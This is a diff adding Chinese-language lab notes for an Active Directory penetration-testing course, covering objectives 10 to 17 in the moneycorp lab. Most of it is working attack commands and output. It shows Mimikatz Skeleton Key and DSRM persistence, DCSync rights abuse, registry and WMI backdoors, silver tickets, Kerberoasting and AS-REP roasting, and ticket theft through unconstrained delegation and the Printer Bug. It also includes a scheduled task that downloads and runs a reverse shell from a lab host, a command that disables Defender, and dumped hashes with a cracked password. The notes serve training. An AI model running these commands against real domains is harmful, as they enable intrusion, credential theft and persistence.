@@ -1106,3 +1106,793 @@ RegisteredUser  : Windows User
 SerialNumber    : 00377-80000-00000-AA805
 Version         : 10.0.14393
 ```
+
+
+# Learning Objective 10:
+Task
+● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.
+
+万能钥匙作为权限维持的手段，制作完成以后可以以密码```mimikatz```访问域内任何一台计算机
+
+开一个DA权限的shell
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+
+### 方法1
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+开一个学生shell使用下面命令以administrator的身份进入主机
+```Enter-PSSession –Computername dcorp-dc –credential dcorp\administrator```
+
+
+### 方法2(推荐)
+
+回到学生机器,创建一个DC的登录session
+```
+$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
+```
+
+把mimikatz加载到指定session
+```
+ Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
+```
+
+再次进入DC
+```
+ Enter-PSSession -Session $sess
+```
+
+执行mimikatz，制作万能钥匙
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+```
+
+开一个学生shell使用下面命令以student370的身份进入主机
+```Enter-PSSession –Computername dcorp-dc –credential dcorp\administrator```
+
+
+# Learning Objective 11:
+Task
+● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
+
+目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改
+
+用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码
+
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
+
+SAMKey : 33e0913ef3886d77d5873060bcea1cfb
+
+RID  : 000001f4 (500)
+User : Administrator
+Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
+```
+这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```
+
+再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较
+
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : af0686cc0ca8f04df42210c9ac980760
+```
+新的密码是：```af0686cc0ca8f04df42210c9ac980760```
+
+DSRM administrator不允许登陆，用之前的session进入DC修改
+
+要先bypass ASMI
+
+再运行下面命令，修改DSRM的远程登录策略
+```
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+
+
+现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+
+验证:
+```
+PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+
+
+    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/29/2019   1:32 AM                PerfLogs
+d-r---        2/16/2019   9:14 PM                Program Files
+d-----        7/16/2016   6:23 AM                Program Files (x86)
+d-r---       12/14/2019   8:23 PM                Users
+d-----        8/20/2020   2:05 AM                Windows
+```
+
+可以访问文件系统，但是不能在这台系统上执行命令。
+
+如果想要用DSRM获得一个shell，可以设置一个定时任务
+
+
+## 制作定时任务：
+```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+## 触发定时任务
+```
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
+```
+
+
+获得反弹shell
+```
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64272
+Windows PowerShell running as user DCORP-DC$ on DCORP-DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+dcorp-dc
+```
+
+
+# Learning Objective 12:
+Task
+● Check if studentx has Replication (DCSync) rights.
+● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
+● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
+
+
+
+## Check if studentx has Replication (DCSync) rights.
+
+查找账号student366是否有DCSync的权限（此操作需要DA权限）
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+```
+如果没有任何返回，表示没有权限
+
+## If yes, execute the DCSync attack to pull hashes of the krbtgt user.
+
+问题前提不成立
+
+
+## If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
+
+添加完全控制权限
+```
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
+```
+再把Dcsync权限赋予当前学生账号student366
+```
+Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
+```
+
+再次查看账号student366是否有DCSync的权限,看到这次已经有返回
+```
+PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference
+ -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+
+
+InheritedObjectType   : All
+ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : dcorp\student366
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-1874506631-3219952063-538504511
+```
+
+出现```ActiveDirectoryRights : GenericAll```表示成功赋权
+
+执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作））
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+
+# Learning Objective 13:
+Task
+● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+
+本章节内容为安全描述符。
+
+## Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
+
+在DA权限shell引入RACE.ps1框架
+```
+PS C:\ad> . .\RACE.ps1
+```
+
+为WMI修改安全描述符，允许student366进入WMI
+```
+Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+```
+
+查看
+```
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令
+
+DA shell，引入RACE.ps1，域名写全
+```
+PS C:\ad> . .\RACE.ps1
+PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+```
+
+在学生shell（重启VM生效），执行whoami命令
+```
+Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+## Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
+
+### 无管理员密码的情况下从目标机器上dump出哈希
+
+Modifying DC registry security descriptors for remote hash retrieval using DAMP
+
+在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
+```
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
+```
+
+在学生shell（重启VM生效）
+引入框架
+```
+PS C:\ad> . .\RACE.ps1
+```
+
+dump出dcorp-dc这台机器的哈希
+```
+PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
+VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9
+
+ComputerName                        MachineAccountHash
+------------                        ------------------
+dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
+```
+
+现在我们有了这台机器的哈希，可以用来制作银票
+
+基于HOST服务的银票
+```
+. .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
+```
+
+基于RPCSS服务的银票
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
+```
+
+可以建一个定时任务反弹DC这台服务器的shell。
+
+
+# Learning Objective 14:
+Task
+● Using the Kerberoast attack, crack password of a SQL server service account.
+
+查看所有SPN
+```
+PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname
+
+userprincipalname serviceprincipalname
+----------------- --------------------
+                  kadmin/changepw
+websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
+svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
+```
+
+尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。
+
+因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet
+
+下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
+```
+PS C:\ad> Add-Type -AssemblyName System.IdentityModel
+PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dolla
+rcorp.moneycorp.local"
+
+
+Id                   : uuid-396ea046-4707-42b5-aeca-14c64449d666-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/21/2022 7:06:53 AM
+ValidTo              : 2/21/2022 5:03:41 PM
+ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+```
+
+用klist命令
+
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x3114e90c
+
+Cached Tickets: (11)
+
+<略>
+#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/20/2022 23:06:53 (local)
+        End Time:   2/21/2022 9:03:41 (local)
+        Renew Time: 2/27/2022 23:03:41 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
+<略>
+```
+
+有MSSQLSvc的TGS。client就是学生账号student366
+
+用Mimikatz dump出tikets
+
+```
+ Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 2/20/2022 11:06:53 PM ; 2/21/2022 9:03:41 AM ; 2/27/2022 11:03:41 PM
+   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+   * Saved to file     : 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
+
+拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
+
+执行命令：
+```
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+爆破结果
+```
+PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarco
+rp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp
+.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+All tickets cracked!
+```
+
+得到了svcadmin的明文密码
+```
+*ThisisBlasphemyThisisMadness!!
+```
+
+用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
+```
+PS C:\ad> Enter-PSSession –Computername dcorp-dc –credential dcorp\svcadmin
+[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
+dcorp\svcadmin
+[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
+dcorp-dc
+[dcorp-dc]: PS C:\Users\svcadmin\Documents>
+```
+
+# Learning Objective 15:
+Task
+● Enumerate users that have Kerberos Preauth disabled.
+● Obtain the encrypted part of AS-REP for such an account.
+● Determine if studentx has permission to set User Account Control flags for any user.
+● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+
+##  Enumerate users that have Kerberos Preauth disabled.
+
+注意这里用的是dev版本的PowerView
+
+枚举禁用了Kerberos预认证的用户
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
+```
+
+枚举到一个VPN359user用户禁用了Kerberos预认证
+
+## Obtain the encrypted part of AS-REP for such an account.
+
+使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解
+
+```
+PS C:\ad> cd .\ASREPRoast-master\
+PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
+PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
+```
+
+tool里面没有JTR，去到kali破解这个哈希
+
+## Determine if studentx has permission to set User Account Control flags for any user.
+
+枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户
+
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
+IdentityReferenceName   : RDPUsers
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : group
+```
+
+因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限
+
+## If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+
+强制关闭这些用户的预认证
+```
+Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+关闭以后获取这个用户的krb5哈希
+
+```
+Get-ASREPHash -UserName Control359User -Verbose
+```
+
+获取的这个值可以用JTR破解
+
+
+# Learning Objective 16:
+Task
+● Determine if studentx has permissions to set UserAccountControl flags for any user.
+● If yes, force set a SPN on the user and obtain a TGS for the user.
+
+
+## Determine if studentx has permissions to set UserAccountControl flags for any user.
+
+从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
+```
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights
+
+bjectDN                                                       ActiveDirectoryRights
+--------                                                       ---------------------
+CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+```
+
+有权限。
+
+
+## If yes, force set a SPN on the user and obtain a TGS for the user.
+
+选择Support370User用户，查询这个账号是否有SPN
+
+```
+PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
+
+
+serviceprincipalname
+--------------------
+```
+
+没有。
+
+因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
+```
+Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
+```
+
+根据这个SPN，我们可以请求一个可以被破解的ticket
+```
+PS C:\ad> Add-Type -AssemblyNAme System.IdentityModel
+PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"
+
+
+Id                   : uuid-c2d65b15-bd68-4703-bb99-88bc08a6970c-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/21/2022 8:13:32 AM
+ValidTo              : 2/21/2022 5:57:53 PM
+ServicePrincipalName : dcorp/whateverX
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+```
+
+使用klist命令列出SPN
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x3270d
+#2>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/21/2022 0:13:32 (local)
+        End Time:   2/21/2022 9:57:53 (local)
+        Renew Time: 2/27/2022 23:57:53 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
+```
+
+看到已经有dcorp/whateverX的SPN
+
+用mimikatz导出
+
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
+   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+导出来的tiket可以用tgsrepcrack.py破解
+
+```
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+也可以用powerview导出krb5哈希，然后再用john破解
+```
+Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash
+```
+
+# Learning Objective 17:
+Task
+•  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
+•  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
+
+
+## Find a server in the dcorp domain where Unconstrained Delegation is enabled.
+
+非约束委派
+
+枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
+```
+PS C:\ad> Get-NetComputer -UnConstrained |select cn
+cn
+--
+DCORP-DC
+DCORP-APPSRV
+```
+
+枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv
+
+##  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.
+
+什么是无约束委派？
+
+> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。
+
+在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。
+
+由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
+我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
+之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
+现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
+```
+appadmin:d549831a955fee51a43c83efb3928fa7
+srvadmin:a98e18228819e8eec3dfa33cb68b0728
+websvc：cc098f204c5887eaa8253e7c2749156f
+```
+
+分别对三个用户执行下面权限，得到一个该用户的新shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
+```
+
+
+appadmin拥有local admin权限的机器有
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Find-LocalAdminAccess
+dcorp-adminsrv.dollarcorp.moneycorp.local
+dcorp-std366.dollarcorp.moneycorp.local
+dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+websvc拥有local admin权限的机器有
+```
+ PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Find-LocalAdminAccess
+dcorp-std366.dollarcorp.moneycorp.local
+```
+
+srvadmin拥有local admin权限的机器有
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Find-LocalAdminAccess
+dcorp-adminsrv.dollarcorp.moneycorp.local
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-std366.dollarcorp.moneycorp.local
+```
+
+由枚举结果可知，符合条件的只有appadmin
+
+起一个dcorp-appsrv的session
+```
+$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
+```
+Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
+```
+
+指定目标靶机的session，在目标靶机关闭杀软
+```
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+```
+
+横向到dcorp-appsrv，创建一个文件夹
+```
+PS C:\ad> Enter-PSSession $sess
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> mkdir user366
+```
+
+用Mimikatz导出所有令牌，看看是否有Administrator的令牌
+```
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::tickets /export
+
+<略>
+
+Authentication Id : 0 ; 3929288 (00000000:003bf4c8)
+Session           : Network from 0
+User Name         : Administrator
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 2/15/2022 6:02:00 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-500
+
+         * Username : Administrator
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 2/15/2022 6:02:00 AM ; 2/15/2022 4:02:00 PM ; 2/22/2022 6:02:00 AM
+           Service Name (02) : krbtgt ; DOLLARCORP.MONEYCORP.LOCAL ; @ DOLLARCORP.MONEYCORP.LOCAL
+           Target Name  (--) : @ DOLLARCORP.MONEYCORP.LOCAL
+           Client Name  (01) : Administrator ; @ DOLLARCORP.MONEYCORP.LOCAL
+           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             2d67ea81d9628838bac1d03a94ecaa0ac1002bff18529deb112cf2238b7a6270
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi !
+<略>
+```
+
+如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
+```
+
+如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
+```
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+
+* File: 'C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
+```
+执行成功！
+
+测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
+```
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
+dcorp\administrator
+dcorp-dc
+```
+
+证明我们已经取得了DA权限
+
+### 方法二（Printer Bug）
+
+原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。
+
+重新起一个appadmin的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
+```
+
+回到学生机，执行下面命令
+
+```
+.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+
+然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
+```
+[*] 2/15/2022 2:50:23 PM UTC - Found new TGT:
+
+  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
+  StartTime             :  2/14/2022 10:34:09 PM
+  EndTime               :  2/15/2022 8:34:09 AM
+  RenewTill             :  2/21/2022 1:00:49 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
